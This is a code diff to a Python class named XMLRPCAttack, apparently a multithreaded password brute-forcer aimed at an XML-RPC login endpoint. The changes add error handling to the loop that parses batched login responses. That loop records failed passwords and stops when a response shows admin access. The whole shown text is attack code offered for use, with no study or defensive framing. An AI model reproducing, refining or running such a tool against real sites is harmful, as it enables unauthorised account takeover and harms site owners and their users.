@@ -108,26 +108,30 @@ class XMLRPCAttack:
         result_index = 0
         result = ''
 
-        for index, value in enumerate(root.findall('.//value/struct')):
-            fault_string = None
-            fault_code = None
-            is_admin = None
+        try:
+            for index, value in enumerate(root.findall('.//value/struct')):
+                fault_string = None
+                fault_code = None
+                is_admin = None
 
-            try:
-                fault_code = value.find('.//member[name=\'faultCode\']/value/int').text
-                fault_string = value.find('.//member[name=\'faultString\']/value/string').text
-            except Exception:
-                is_admin = value.find('.//member[name=\'isAdmin\']/value/boolean').text
+                try:
+                    fault_code = value.find('.//member[name=\'faultCode\']/value/int').text
+                    fault_string = value.find('.//member[name=\'faultString\']/value/string').text
+                except Exception:
+                    is_admin = value.find('.//member[name=\'isAdmin\']/value/boolean').text
 
-            if fault_string and fault_code and 'Incorrect username or password.' in fault_string:
-                results.append((passwords_batch[index], fault_code, fault_string))
-            else:
-                if is_admin:
-                    self.found.set()
-                    found = True
-                    result_index = index
-                    result = passwords_batch[index]
-                    break
+                if fault_string and fault_code and 'Incorrect username or password.' in fault_string:
+                    results.append((passwords_batch[index], fault_code, fault_string))
+                else:
+                    if is_admin:
+                        self.found.set()
+                        found = True
+                        result_index = index
+                        result = passwords_batch[index]
+                        break
+        except Exception as e:
+            print(e)
+            return
 
         if found:
             print('found')
@@ -147,7 +151,10 @@ class XMLRPCAttack:
             with ThreadPoolExecutor(max_workers=self.threads) as executor:
                 futures = [executor.submit(self.send_request) for _ in range(self.threads)]
                 for future in as_completed(futures):
-                    future.result()
+                    try:
+                        future.result()
+                    except Exception:
+                        continue
                     if self.found.is_set():
                         break
             time.sleep(self.delay)
